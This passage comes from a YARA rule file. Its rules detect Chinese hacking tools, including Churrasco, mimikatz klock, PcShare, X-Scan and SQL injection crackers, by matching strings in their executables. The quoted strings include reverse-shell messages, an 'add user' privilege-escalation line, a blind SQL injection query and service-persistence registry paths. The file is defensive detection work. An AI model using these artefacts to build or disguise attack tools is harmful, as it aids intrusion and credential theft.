fullword ascii\n        $s5 = \"StrStrA\" fullword ascii\n        $s6 = \"StrToIntA\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 50KB and all of them\n}\n\nrule ChineseHacktools_dat_NaslLib\n{\n    meta:\n        description = \"Chinese hacktool (file: NaslLib.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"dat_NaslLib\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"nessus_get_socket_from_connection: fd <%d> is closed\" fullword ascii\n        $s2 = \"[*] \\\"%s\\\" completed, %d/%d/%d/%d:%d:%d - %d/%d/%d/%d:%d:%d\" fullword ascii\n        $s3 = \"A FsSniffer backdoor seems to be running on this port%s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1360KB and all of them\n}\n\nrule ChineseHacktools_Dos_1\n{\n    meta:\n        description = \"Chinese hacktool (file: 1.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"/churrasco/-->Usage: Churrasco.exe \\\"command to run\\\"\" fullword ascii\n        $s2 = \"/churrasco/-->Done, command should have ran as SYSTEM!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule ChineseHacktools_OtherTools_servu\n{\n    meta:\n        description = \"Chinese hacktool (file: svu.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OtherTools_servu\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"MZKERNEL32.DLL\" fullword ascii\n        $s1 = \"UpackByDwing@\" fullword ascii\n        $s2 = \"GetProcAddress\" fullword ascii\n        $s3 = \"WriteFile\" fullword ascii\n\n    condition:\n        $s0 at 0 and filesize < 50KB and all of them\n}\n\nrule ChineseHacktools_ustrrefadd\n{\n    meta:\n        description = \"Chinese hacktool (file: ustrrefadd.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ustrrefadd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"E-Mail  : admin@luocong.com\" fullword ascii\n        $s1 = \"Homepage: http://www.luocong.com\" fullword ascii\n        $s2 = \": %d  -  \" fullword ascii\n        $s3 = \"ustrreffix.dll\" fullword ascii\n        $s5 = \"Ultra String Reference plugin v%d.%02d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 320KB and all of them\n}\n\nrule ChineseHacktools_XScanLib\n{\n    meta:\n        description = \"Chinese hacktool (file: XScanLib.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"XScanLib\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s4 = \"XScanLib.dll\" fullword ascii\n        $s6 = \"Ports/%s/%d\" fullword ascii\n        $s8 = \"DEFAULT-TCP-PORT\" fullword ascii\n        $s9 = \"PlugCheckTcpPort\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 360KB and all of them\n}\n\nrule ChineseHacktools_IDTools_For_WinXP_IdtTool\n{\n    meta:\n        description = \"Chinese hacktool (file: IdtTool.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"IDTools_For_WinXP_IdtTool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"IdtTool.sys\" fullword ascii\n        $s4 = \"Idt Tool bY tMd[CsP]\" fullword wide\n        $s6 = \"\\\\\\\\.\\\\slIdtTool\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule ChineseHacktools_GoodToolset_ms11046\n{\n    meta:\n        description = \"Chinese hacktool (file: ms11046.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoodToolset_ms11046\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[*] Token system command\" fullword ascii\n        $s2 = \"[*] command add user 90sec 90sec\" fullword ascii\n        $s3 = \"[*] Add to Administrators success\" fullword ascii\n        $s4 = \"[*] User has been successfully added\" fullword ascii\n        $s5 = \"Program: %s%s%s%s%s%s%s%s%s%s%s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 840KB and 2 of them\n}\n\nrule ChineseHacktools_Cmdshell32\n{\n    meta:\n        description = \"Chinese hacktool (file: Cmdshell32.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Cmdshell32\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmdshell.exe\" fullword wide\n        $s2 = \"cmdshell\" fullword ascii\n        $s3 = \"[Root@CmdShell ~]#\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 62KB and all of them\n}\n\nrule ChineseHacktools_Sniffer_analyzer_SSClone_1210_full_version\n{\n    meta:\n        description = \"Chinese hacktool (file: Sniffer analyzer SSClone 1210 full version.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Sniffer_analyzer_SSClone_1210_full_version\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"http://www.vip80000.com/hot/index.html\" fullword ascii\n        $s1 = \"GetConnectString\" fullword ascii\n        $s2 = \"CnCerT.Safe.SSClone.dll\" fullword ascii\n        $s3 = \"(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3580KB and all of them\n}\n\nrule ChineseHacktools_x64_klock\n{\n    meta:\n        description = \"Chinese hacktool (file: klock.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"x64_klock\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Bienvenue dans un processus distant\" fullword wide\n        $s2 = \"klock.dll\" fullword ascii\n        $s3 = \"Erreur : le bureau courant (\" fullword wide\n        $s4 = \"klock de mimikatz pour Windows\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 907KB and all of them\n}\n\nrule ChineseHacktools_Dos_Down32\n{\n    meta:\n        description = \"Chinese hacktool (file: Down32.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_Down32\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n        $s6 = \"down.exe\" fullword wide\n        $s15 = \"get_Form1\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 137KB and all of them\n}\n\nrule ChineseHacktools_MarathonTool_2\n{\n    meta:\n        description = \"Chinese hacktool (file: MarathonTool.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"MarathonTool_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s3 = \"http://localhost/retomysql/pista.aspx?id_pista=1\" fullword wide\n        $s6 = \"SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS\" fullword wide\n        $s17 = \"/Blind SQL injection tool based in heavy queries\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule ChineseHacktools_scanms_scanms\n{\n    meta:\n        description = \"Chinese hacktool (file: scanms.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"scanms_scanms\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"--- ScanMs Tool --- (c) 2003 Internet Security Systems ---\" fullword ascii\n        $s2 = \"Scans for systems vulnerable to MS03-026 vuln\" fullword ascii\n        $s3 = \"More accurate for WinXP/Win2k, less accurate for WinNT\" fullword ascii\n        $s4 = \"added %d.%d.%d.%d-%d.%d.%d.%d\" fullword ascii\n        $s5 = \"Internet Explorer 1.0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and 3 of them\n}\n\nrule ChineseHacktools_PcShare\n{\n    meta:\n        description = \"Chinese hacktool (file: PcShare.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_PcShare\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;\" fullword wide\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)\" fullword wide\n        $s2 = \"http://www.pcshares.cn/pcshare200/lostpass.asp\" fullword wide\n        $s5 = \"port=%s;name=%s;pass=%s;\" fullword wide\n        $s16 = \"%s\\\\ini\\\\*.dat\" fullword wide\n        $s17 = \"pcinit.exe\" fullword wide\n        $s18 = \"http://www.pcshare.cn\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 6000KB and 3 of them\n}\n\nrule ChineseHacktools_pw_inspector\n{\n    meta:\n        description = \"Chinese hacktool (file: pw-inspector.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"pw_inspector\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"-m MINLEN  minimum length of a valid password\" fullword ascii\n        $s2 = \"http://www.thc.org\" fullword ascii\n        $s3 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 460KB and all of them\n}\n\nrule ChineseHacktools_Dll_LoadEx\n{\n    meta:\n        description = \"Chinese hacktool (file: Dll_LoadEx.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dll_LoadEx\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"WiNrOOt@126.com\" fullword wide\n        $s1 = \"Dll_LoadEx.EXE\" fullword wide\n        $s3 = \"You Already Loaded This DLL ! :(\" fullword ascii\n        $s10 = \"Dll_LoadEx Microsoft \" fullword wide\n        $s17 = \"Can't Load This Dll ! :(\" fullword ascii\n        $s18 = \"WiNrOOt\" fullword wide\n        $s20 = \" Dll_LoadEx(&A)...\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 120KB and 3 of them\n}\n\nrule ChineseHacktools_dat_report\n{\n    meta:\n        description = \"Chinese hacktool (file: report.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"dat_report\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<a href=\\\"http://www.xfocus.net\\\">X-Scan</a>\" fullword ascii\n        $s2 = \"REPORT-ANALYSIS-OF-HOST\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 480KB and all of them\n}\n\nrule ChineseHacktools_Dos_iis7\n{\n    meta:\n        description = \"Chinese hacktool (file: iis7.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_iis7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\\\\\localhost\" fullword ascii\n        $s1 = \"iis.run\" fullword ascii\n        $s3 = \">Could not connecto %s\" fullword ascii\n        $s5 = \"WHOAMI\" ascii\n        $s13 = \"WinSta0\\\\Default\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule ChineseHacktools_SwitchSniffer\n{\n    meta:\n        description = \"Chinese hacktool (file: SwitchSniffer.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SwitchSniffer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"NextSecurity.NET\" fullword wide\n        $s2 = \"SwitchSniffer Setup\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and all of them\n}\n\nrule ChineseHacktools_dbexpora\n{\n    meta:\n        description = \"Chinese hacktool (file: dbexpora.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"dbexpora\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"SELECT A.USER FROM SYS.USER_USERS A \" fullword ascii\n        $s12 = \"OCI 8 - OCIDescriptorFree\" fullword ascii\n        $s13 = \"ORACommand *\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 835KB and all of them\n}\n\nrule ChineseHacktools_SQLCracker\n{\n    meta:\n        description = \"Chinese hacktool (file: SQLCracker.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SQLCracker\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"msvbvm60.dll\" fullword ascii\n        $s1 = \"_CIcos\" fullword ascii\n        $s2 = \"kernel32.dll\" fullword ascii\n        $s3 = \"cKmhV\" fullword ascii\n        $s4 = \"080404B0\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 125KB and all of them\n}\n\nrule ChineseHacktools_FreeVersion_debug\n{\n    meta:\n        description = \"Chinese hacktool (file: debug.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FreeVersion_debug\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"c:\\\\Documents and Settings\\\\Administrator\\\\\" fullword ascii\n        $s1 = \"Got WMI process Pid: %d\" ascii\n        $s2 = \"This exploit will execute\" ascii\n        $s6 = \"Found token %s \" ascii\n        $s7 = \"Running reverse shell\" ascii\n        $s10 = \"wmiprvse.exe\" fullword ascii\n        $s12 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 820KB and 3 of them\n}\n\nrule ChineseHacktools_Dos_look\n{\n    meta:\n        description = \"Chinese hacktool (file: look.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_look\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<description>CHKen QQ:41901298</description>\" fullword ascii\n        $s2 = \"version=\\\"9.9.9.9\\\"\" fullword ascii\n        $s3 = \"name=\\\"CH.Ken.Tool\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and all of them\n}\n\nrule ChineseHacktools_NtGodMode\n{\n    meta:\n        description = \"Chinese hacktool (file: NtGodMode.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"NtGodMode\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"to HOST!\" fullword ascii\n        $s1 = \"SS.EXE\" fullword ascii\n        $s5 = \"lstrlen0\" fullword ascii\n        $s6 = \"Virtual\" fullword ascii\n        $s19 = \"RtlUnw\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 45KB and all of them\n}\n\nrule ChineseHacktools_WebCrack4_RouterPasswordCracking\n{\n    meta:\n        description = \"Chinese hacktool (file: WebCrack4-RouterPasswordCracking.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WebCrack4_RouterPasswordCracking\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD\" fullword ascii\n        $s1 = \"Username: \\\"%s\\\", Password: \\\"%s\\\", Remarks: \\\"%s\\\"\" fullword ascii\n        $s14 = \"user:\\\"%s\\\" pass: \\\"%s\\\" result=\\\"%s\\\"\" fullword ascii\n        $s16 = \"Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)\" fullword ascii\n        $s20 = \"List count out of bounds (%d)+Operation not allowed on sorted string list%String\" wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and 2 of them\n}\n\nrule ChineseHacktools_hscan_gui\n{\n    meta:\n        description = \"Chinese hacktool (file: hscan-gui.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"hscan_gui\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Hscan.EXE\" fullword wide\n        $s1 = \"RestTool.EXE\" fullword ascii\n        $s3 = \"Hscan Application \" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule ChineseHacktools_S_MultiFunction_Scanners_s\n{\n    meta:\n        description = \"Chinese hacktool (file: s.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"S_MultiFunction_Scanners_s\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe /l=\" fullword ascii\n        $s1 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe\" fullword ascii\n        $s2 = \"C:\\\\WINDOWS\\\\temp\\\\s.exe tcp \" fullword ascii\n        $s3 = \"explorer.exe http://www.hackdos.com\" fullword ascii\n        $s4 = \"C:\\\\WINDOWS\\\\temp\\\\pojie.exe\" fullword ascii\n        $s5 = \"Failed to read file or invalid data in file!\" fullword ascii\n        $s6 = \"www.hackdos.com\" fullword ascii\n        $s7 = \"WTNE / MADE BY E COMPILER - WUTAO \" fullword ascii\n        $s11 = \"The interface of kernel library is invalid!\" fullword ascii\n        $s12 = \"eventvwr\" fullword ascii\n        $s13 = \"Failed to decompress data!\" fullword ascii\n        $s14 = \"NOTEPAD.EXE result.txt\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 8000KB and 4 of them\n}\n\nrule ChineseHacktools_Dos_GetPass\n{\n    meta:\n        description = \"Chinese hacktool (file: GetPass.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_GetPass\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"GetLogonS\" ascii\n        $s3 = \"/showthread.php?t=156643\" ascii\n        $s8 = \"To Run As Administ\" ascii\n        $s18 = \"EnableDebugPrivileg\" fullword ascii\n        $s19 = \"sedebugnameValue\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 890KB and all of them\n}\n\nrule ChineseHacktools_update_PcMain\n{\n    meta:\n        description = \"Chinese hacktool (file: PcMain.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"update_PcMain\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322\" ascii\n        $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n        $s2 = \"SOFTWARE\\\\Classes\\\\HTTP\\\\shell\\\\open\\\\command\" fullword ascii\n        $s3 = \"\\\\svchost.exe -k \" fullword ascii\n        $s4 = \"SYSTEM\\\\ControlSet001\\\\Services\\\\%s\" fullword ascii\n        $s9 = \"Global\\\\%s-key-event\" fullword ascii\n        $s10 = \"%d%d.exe\" fullword ascii\n        $s14 = \"%d.exe\" fullword ascii\n        $s15 = \"Global\\\\%s-key-metux\" fullword ascii\n        $s18 = \"GET / HTTP/1.1\" fullword ascii\n        $s19 = \"\\\\Services\\\\\" fullword ascii\n        $s20 = \"qy001id=%d;qy001guid=%s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and 4 of them\n}\n\nrule ChineseHacktools_Dos_sys\n{\n    meta:\n        description = \"Chinese hacktool (file: sys.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_sys\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"'SeDebugPrivilegeOpen \" fullword ascii\n        $s6 = \"Author: Cyg07*2\" fullword ascii\n        $s12 = \"from golds7n[LAG]'J\" fullword ascii\n        $s14 = \"DAMAGE\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule ChineseHacktools_dat_xpf\n{\n    meta:\n        description = \"Chinese hacktool (file: xpf.sys)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"dat_xpf\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"UnHook IoGetDeviceObjectPointer ok!\" fullword ascii\n        $s2 = \"\\\\Device\\\\XScanPF\" fullword wide\n        $s3 = \"\\\\DosDevices\\\\XScanPF\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule ChineseHacktools_Project1\n{\n    meta:\n        description = \"Chinese hacktool (file: Project1.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        